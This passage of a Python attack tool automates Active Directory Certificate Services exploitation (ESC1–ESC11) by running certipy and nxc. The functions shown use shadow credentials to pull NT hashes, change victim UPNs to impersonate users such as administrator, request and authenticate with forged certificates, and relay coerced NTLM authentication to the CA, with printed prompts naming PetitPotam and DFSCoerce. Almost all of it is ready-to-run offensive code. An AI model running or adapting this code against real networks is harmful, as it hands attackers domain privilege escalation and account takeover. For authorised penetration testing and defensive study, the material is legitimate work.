        m = re.search(r"NT hash for '.*?': ([0-9a-fA-F]{32})", line)
        if m:
            nt_hash = m.group(1)
    proc.wait()

    if nt_hash:
        print(f"{green}[+] Extracted NT hash: {red}{nt_hash}{reset}")
    else:
        print(f"{red}[-] Failed to extract NT hash{reset}")
        return None

    victim2 = input(f"{cyan}[?] Which user would you like to drop the hash for (ex: administrator): {reset}")
    up_cmd = add_proxy_opts(f"certipy account update -u {username}@{domain} -p {password} -user {victim} -upn {victim2}@{domain}")
    print(f"{msg}: {cyan}{up_cmd} {reset}")
    subprocess.call(up_cmd, shell=True)
    print(f"{green}[+] We have updated {red}{victim}{green} UPN to be {red}{victim2}{green} UPN, this will be cleaned up at the end{reset}")

    req_cmd = add_proxy_opts(f"certipy req -u {victim}@{domain} -hashes {nt_hash} -ca {ca} -template user")
    print(f"{msg}: {cyan}{req_cmd} {reset}")
    subprocess.call(req_cmd, shell=True)

    rev_cmd = add_proxy_opts(f"certipy account update -u {username}@{domain} -p {password} -user {victim} -upn {victim}@{domain}")
    print(f"{msg}: {cyan}{rev_cmd} {reset}")
    subprocess.call(rev_cmd, shell=True)
    print(f"{green}[+] Account permissions normal again for {red}{victim}{green} and {red}{victim2}{reset}")

    a_cmd = add_proxy_opts(f"certipy auth -pfx {victim2}.pfx -domain {domain} -dc-ip {ip}")
    print(f"{msg}: {cyan}{a_cmd} {reset}")
    subprocess.call(a_cmd, shell=True)

def run_esc10_2():
    print(f"{green}[+] For this to work The CertificateMappingMethods needs to be set to {red}0x4{green}. However, as a normal user we cannot look at the registry key. This means we would just have to try the exploit{reset}")
    print(f"{green}[+] We also need full control over {red}{victim}{green} with {username}")
    sha_cmd = add_proxy_opts(f"certipy shadow auto -u {username}@{domain} -p {password} -account {victim}")
    print(f"{msg} {cyan}{sha_cmd} {reset}")
    proc = subprocess.Popen(sha_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    nt_hash = None
    for line in proc.stdout:
        print(line.strip())
        m = re.search(r"NT hash for '.*?': ([0-9a-fA-F]{32})", line)
        if m:
            nt_hash = m.group(1)
    proc.wait()

    if nt_hash:
        print(f"{green}[+] Extracted NT hash: {red}{nt_hash}{reset}")
    else:
        print(f"{red}[-] Failed to extract NT hash{reset}")
        return None
    nx = f"nxc smb {ip}"
    subprocess.call(nx, shell=True)
    victim1 = input(f"{cyan}[?] What user do you want to impersonate (ex: administrator): {reset}")
    imp_cmd = add_proxy_opts(f"certipy account update -u {username}@{domain} -p {password} -user {victim} -upn {victim1}")
    print(f"{msg} {cyan}{imp_cmd}{reset}")
    subprocess.call(imp_cmd, shell=True)
    req_cmd = add_proxy_opts(f"certipy req -u {victim}@{domain} -hashes {nt_hash} -ca {ca} -template user")
    print(f"{msg} {cyan}{req_cmd} {reset}")
    subprocess.call(req_cmd, shell=True)
    up_cmd = add_proxy_opts(f"certipy account update -u {username}@{domain} -p {password} -user {victim} -upn {victim}")
    print(f"{msg} {cyan}{up_cmd} {reset}")
    subprocess.call(up_cmd, shell=True)
    a_cmd = add_proxy_opts(f"certipy auth -pfx {victim1}.pfx -domain {domain} -dc-ip {ip}")
    print(f"{msg} {cyan}{a_cmd} {reset}")
    subprocess.call(a_cmd, shell=True)

def run_esc11(ca):
    print(f"{red}[!] Running certipy as sudo -E user due to relay listening{reset}")
    target_ip = input(f"{cyan}[?] ADCS Endpoint IP (target that has http://xxx.xxx.xxx.xxx/certsrv/certnsh.asp): {reset}")
    
    print(f"""{red}[!] You need to do the following in another shell:
        nxc smb <machine to coerce> -M coerce_plus -o LISTENER=<lhost> -o ALWAYS=True -o METHOD=<one of the following PetitPotam, DFSCoerce...""")
    
    relay_cmd = f"sudo -E certipy relay -target rpc://{target_ip} -template DomainController -ca {ca} -template DomainController"
    print(f"{msg}{relay_cmd}{reset}")
    
    # Only use Popen, not subprocess.call
    proc = subprocess.Popen(relay_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    pfx_file = None

    for line in proc.stdout:
        print(line.strip())
        match = re.search(r"Saved certificate and private key to '(.+\.pfx)'", line)
        if match:
            pfx_file = match.group(1)
    
    proc.wait()

    if pfx_file:
        print(f"{green}[+] Detected saved PFX file: {pfx_file}{reset}")
        auth_cmd = add_proxy_opts(f"certipy auth -pfx {pfx_file}")
        print(f"{msg}{auth_cmd}{reset}")
        subprocess.call(auth_cmd, shell=True)
    else:
        print(f"{red}[-] Could not detect saved PFX file in certipy relay output. Please check manually.{reset}")

def main():
    # Handle ESC10 separately
    if ten:
        q = input(f"{cyan}[?] Which ESC10 option? CertificateMappingMethods(c) / StrongCertificateBindingEnforcement(s) / Both(b): {reset}")
        if q == "c":
            run_esc10_2()
        elif q == "s":
            run_esc10()
        elif q == "b":
            run_esc10_2()
            run_esc10()
        else:
            print(f"{red}[-] Invalid choice. Exiting.{reset}")
        return

    # Handle --revert logic
    if args.revert:
        vuln_file = run_certipy_find()
        templates, _, _ = parse_find_output(vuln_file)

        # Search for template matching args.templ
        matched = next((t for t in templates if t["template"].lower() == args.templ.lower()), None)
        if not matched:
            print(f"{red}[-] Template {args.templ} not found in find output. Exiting.{reset}")
            return

        print(f"{green}[+] Found template {args.templ}, reverting...{reset}")
        revert_esc4(matched["template"], matched["ca"], args.json)
        return

    # Run certipy find and parse output
    vuln_file = run_certipy_find()
    templates, ca_vulns, ca_name = parse_find_output(vuln_file)

    if five:
    # Check if certipy find returned a CA name (even if no templates were found)
        if ca_name:
            template_name = "SubCA"
        else:
            # If ca_name wasn't found, ask the user
            print(f"{yellow}[!] No CA name found from certipy find.{reset}")
            ca_name = input(f"{cyan}[?] Enter CA name to use for ESC5: {reset}")
            template_name = "SubCA"
        
        run_esc5(template_name, ca_name)
        return  # stop after ESC5 if you don't want further processing

    # Handle CA-level ESCs first
    if ca_vulns:
        print(f"\n{green}[+] Found CA-level vulnerabilities: {', '.join(ca_vulns)}{reset}")
        for idx, esc in enumerate(ca_vulns, 1):
            print(f"[{idx}] {esc} - {describe_esc(esc)}")
    
        while True:
            esc_choice = input(f"\n{cyan}[?] Do you want to exploit a CA-level ESC? Enter number or 'n' to skip: {reset}")
            if esc_choice.lower() == 'n':
                break
            if esc_choice.isdigit() and 1 <= int(esc_choice) <= len(ca_vulns):
                chosen_ca_esc = ca_vulns[int(esc_choice) - 1]
    
                if chosen_ca_esc == "ESC6":
                    run_esc6(ca_name)
                elif chosen_ca_esc == "ESC7":
                    run_esc7(ca_name)
                elif chosen_ca_esc == "ESC8":
                    run_esc8(ca_name)
                elif chosen_ca_esc == "ESC11":
                    run_esc11(ca_name)
                else:
                    print(f"{red}[-] No exploit logic written for {chosen_ca_esc}{reset}")
                break
            else:
                print(f"{red}[-] Invalid choice. Try again.{reset}")

    # Handle template-level ESCs
    if not templates:
        print(f"{yellow}[!] No vulnerable templates found. Exiting.{reset}")
        return

    selected_template, selected_esc = choose_template_and_esc(templates)
    if not selected_template or not selected_esc:
        print(f"{red}[-] No selection made. Exiting.{reset}")
        return

    template_name = selected_template["template"]
    ca_name = selected_template["ca"]

    if selected_esc == "ESC1":
        run_esc1(template_name, ca_name)
    elif selected_esc == "ESC2":
        q = input(f"{yellow}[?] ESC2 can be exploited 2 ways: ESC1-style(e), on-behalf-of(o), or both(b). Choose (e/o/b): {reset}")
        if q == "e":
            run_esc2_1(template_name, ca_name)
        elif q == "o":
            run_esc2(template_name, ca_name)
        elif q == "b":
            print(f"{msg}[*] Running ESC2 ESC1-style first...{reset}")
            run_esc2_1(template_name, ca_name)
            print(f"{msg}[*] Running ESC2 on-behalf-of next...{reset}")
            run_esc2(template_name, ca_name)
        else:
            print(f"{red}[-] Invalid selection for ESC2.{reset}")
    elif selected_esc == "ESC3":
        run_esc3(template_name, ca_name)
    elif selected_esc == "ESC4":
        run_esc4(template_name, ca_name)
    elif selected_esc == "ESC9":
        run_esc9(template_name, ca_name)
    else:
        print(f"{yellow}[!] Unsupported ESC selected: {selected_esc}{reset}")

if __name__ == "__main__":
    main()
